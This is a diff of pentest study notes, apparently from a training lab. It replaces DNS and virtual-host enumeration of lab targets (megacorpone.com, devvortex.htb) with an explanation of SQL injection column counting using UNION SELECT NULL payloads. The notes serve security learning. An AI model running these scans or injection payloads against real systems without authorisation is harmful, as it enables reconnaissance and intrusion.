-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="nb"&gt;cat &lt;/span&gt;&lt;span class="n"&gt;list&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;
-&lt;span class="n"&gt;www&lt;/span&gt;
-&lt;span class="n"&gt;ftp&lt;/span&gt;
-&lt;span class="n"&gt;mail&lt;/span&gt;
-&lt;span class="n"&gt;owa&lt;/span&gt;
-&lt;span class="n"&gt;proxy&lt;/span&gt;
-&lt;span class="n"&gt;router&lt;/span&gt;
-
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;cat &lt;/span&gt;&lt;span class="n"&gt;list&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="nv"&gt;$ip&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;done&lt;/span&gt;
-&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;has&lt;/span&gt; &lt;span class="n"&gt;address&lt;/span&gt; &lt;span class="n"&gt;149&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;56&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;244&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;87&lt;/span&gt;
-&lt;span class="n"&gt;Host&lt;/span&gt; &lt;span class="n"&gt;ftp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;not&lt;/span&gt; &lt;span class="n"&gt;found&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;3&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;NXDOMAIN&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;has&lt;/span&gt; &lt;span class="n"&gt;address&lt;/span&gt; &lt;span class="n"&gt;51&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;222&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;169&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;212&lt;/span&gt;
-&lt;span class="n"&gt;Host&lt;/span&gt; &lt;span class="n"&gt;owa&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;not&lt;/span&gt; &lt;span class="n"&gt;found&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;3&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;NXDOMAIN&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="n"&gt;Host&lt;/span&gt; &lt;span class="n"&gt;proxy&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;not&lt;/span&gt; &lt;span class="n"&gt;found&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;3&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;NXDOMAIN&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="n"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;has&lt;/span&gt; &lt;span class="n"&gt;address&lt;/span&gt; &lt;span class="n"&gt;51&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;222&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;169&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;214&lt;/span&gt;
+&lt;p&gt;The application might actually return the database error in its HTTP response, or it might return a generic error, or simply return no results. Provided you can detect some difference in the application's response, you can infer how many columns are being returned from the query.
+The second method involves submitting a series of ==UNION== ==SELECT== payloads specifying a different number of null values:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="s1"&gt;&amp;#39; UNION SELECT NULL--&lt;/span&gt;
+&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;UNION&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;UNION&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;wfuzz&lt;/span&gt; &lt;span class="n"&gt;-w&lt;/span&gt; &lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;share&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;wordlists&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;dnsmap&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt; &lt;span class="n"&gt;-u&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;://&lt;/span&gt;&lt;span class="n"&gt;devvortex&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;htb&lt;/span&gt; &lt;span class="n"&gt;-H&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Host: FUZZ.devvortex.htb&amp;#39;&lt;/span&gt; &lt;span class="n"&gt;-t&lt;/span&gt; &lt;span class="n"&gt;50&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;-hc&lt;/span&gt; &lt;span class="n"&gt;302&lt;/span&gt;
-
-&lt;span class="p"&gt;********************************************************&lt;/span&gt;
-&lt;span class="p"&gt;*&lt;/span&gt; &lt;span class="n"&gt;Wfuzz&lt;/span&gt; &lt;span class="n"&gt;3&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt; &lt;span class="n"&gt;The&lt;/span&gt; &lt;span class="n"&gt;Web&lt;/span&gt; &lt;span class="n"&gt;Fuzzer&lt;/span&gt;                         &lt;span class="p"&gt;*&lt;/span&gt;
-&lt;span class="p"&gt;********************************************************&lt;/span&gt;
-
-&lt;span class="n"&gt;Target&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;://&lt;/span&gt;&lt;span class="n"&gt;devvortex&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;htb&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;
-&lt;span class="n"&gt;Total&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;17576&lt;/span&gt;
-
-&lt;span class="p"&gt;=====================================================================&lt;/span&gt;
-&lt;span class="n"&gt;ID&lt;/span&gt;           &lt;span class="n"&gt;Response&lt;/span&gt;   &lt;span class="n"&gt;Lines&lt;/span&gt;    &lt;span class="n"&gt;Word&lt;/span&gt;       &lt;span class="n"&gt;Chars&lt;/span&gt;       &lt;span class="n"&gt;Payload&lt;/span&gt;                     
-&lt;span class="p"&gt;=====================================================================&lt;/span&gt;
-
-&lt;span class="n"&gt;000002154&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="n"&gt;200&lt;/span&gt;        &lt;span class="n"&gt;501&lt;/span&gt; &lt;span class="n"&gt;L&lt;/span&gt;    &lt;span class="n"&gt;1581&lt;/span&gt; &lt;span class="n"&gt;W&lt;/span&gt;     &lt;span class="n"&gt;23221&lt;/span&gt; &lt;span class="n"&gt;Ch&lt;/span&gt;    &lt;span class="s2"&gt;&amp;quot;dev&amp;quot;&lt;/span&gt;
+&lt;p&gt;If the number of nulls does not match the number of columns, the database returns an error, such as:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;gobuster&lt;/span&gt; &lt;span class="n"&gt;vhost&lt;/span&gt; &lt;span class="n"&gt;-u&lt;/span&gt; &lt;span class="n"&gt;devvortex&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;htb&lt;/span&gt; &lt;span class="n"&gt;-w&lt;/span&gt; &lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;share&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;wordlists&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;dnsmap&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;seq&lt;/span&gt; &lt;span class="n"&gt;200&lt;/span&gt; &lt;span class="n"&gt;254&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="n"&gt;51&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;222&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;169&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$ip&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;done&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="n"&gt;grep&lt;/span&gt; &lt;span class="n"&gt;-v&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;not&lt;/span&gt;
-&lt;span class="s2"&gt;found&amp;quot;&lt;/span&gt;
-&lt;span class="p"&gt;...&lt;/span&gt;
-&lt;span class="n"&gt;208&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;169&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;222&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;51&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="n"&gt;-addr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;arpa&lt;/span&gt; &lt;span class="n"&gt;domain&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="n"&gt;pointer&lt;/span&gt; &lt;span class="n"&gt;admin&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
-&lt;span class="n"&gt;209&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;169&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;222&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;51&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="n"&gt;-addr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;arpa&lt;/span&gt; &lt;span class="n"&gt;domain&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="n"&gt;pointer&lt;/span&gt; &lt;span class="n"&gt;beta&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
-&lt;span class="n"&gt;210&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;169&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;222&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;51&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="n"&gt;-addr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;arpa&lt;/span&gt; &lt;span class="n"&gt;domain&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="n"&gt;pointer&lt;/span&gt; &lt;span class="n"&gt;fs1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
-&lt;span class="n"&gt;211&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;169&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;222&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;51&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="n"&gt;-addr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;arpa&lt;/span&gt; &lt;span class="n"&gt;domain&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="n"&gt;pointer&lt;/span&gt; &lt;span class="n"&gt;intranet&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
-&lt;span class="n"&gt;212&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;169&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;222&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;51&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="n"&gt;-addr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;arpa&lt;/span&gt; &lt;span class="n"&gt;domain&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="n"&gt;pointer&lt;/span&gt; &lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
-&lt;span class="n"&gt;213&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;169&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;222&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;51&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="n"&gt;-addr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;arpa&lt;/span&gt; &lt;span class="n"&gt;domain&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="n"&gt;pointer&lt;/span&gt; &lt;span class="n"&gt;mail2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
-&lt;span class="n"&gt;214&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;169&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;222&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;51&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="n"&gt;-addr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;arpa&lt;/span&gt; &lt;span class="n"&gt;domain&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="n"&gt;pointer&lt;/span&gt; &lt;span class="n"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
-&lt;span class="n"&gt;215&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;169&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;222&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;51&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="n"&gt;-addr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;arpa&lt;/span&gt; &lt;span class="n"&gt;domain&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="n"&gt;pointer&lt;/span&gt; &lt;span class="n"&gt;siem&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
-&lt;span class="n"&gt;216&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;169&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;222&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;51&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="n"&gt;-addr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;arpa&lt;/span&gt; &lt;span class="n"&gt;domain&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="n"&gt;pointer&lt;/span&gt; &lt;span class="n"&gt;snmp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
-&lt;span class="n"&gt;217&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;169&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;222&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;51&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="n"&gt;-addr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;arpa&lt;/span&gt; &lt;span class="n"&gt;domain&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="n"&gt;pointer&lt;/span&gt; &lt;span class="n"&gt;syslog&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
-&lt;span class="n"&gt;218&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;169&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;222&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;51&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="n"&gt;-addr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;arpa&lt;/span&gt; &lt;span class="n"&gt;domain&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="n"&gt;pointer&lt;/span&gt; &lt;span class="n"&gt;support&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
-&lt;span class="n"&gt;219&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;169&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;222&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;51&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="n"&gt;-addr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;arpa&lt;/span&gt; &lt;span class="n"&gt;domain&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="n"&gt;pointer&lt;/span&gt; &lt;span class="n"&gt;test&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
-&lt;span class="n"&gt;220&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;169&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;222&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;51&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="n"&gt;-addr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;arpa&lt;/span&gt; &lt;span class="n"&gt;domain&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="n"&gt;pointer&lt;/span&gt; &lt;span class="n"&gt;vpn&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;dnsrecon&lt;/span&gt; &lt;span class="n"&gt;-d&lt;/span&gt; &lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;-t&lt;/span&gt; &lt;span class="n"&gt;std&lt;/span&gt;
-&lt;span class="p"&gt;[*]&lt;/span&gt; &lt;span class="n"&gt;std&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Performing&lt;/span&gt; &lt;span class="n"&gt;General&lt;/span&gt; &lt;span class="n"&gt;Enumeration&lt;/span&gt; &lt;span class="n"&gt;against&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt;
-&lt;span class="p"&gt;[-]&lt;/span&gt; &lt;span class="n"&gt;DNSSEC&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="n"&gt;not&lt;/span&gt; &lt;span class="n"&gt;configured&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;megacorpone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;
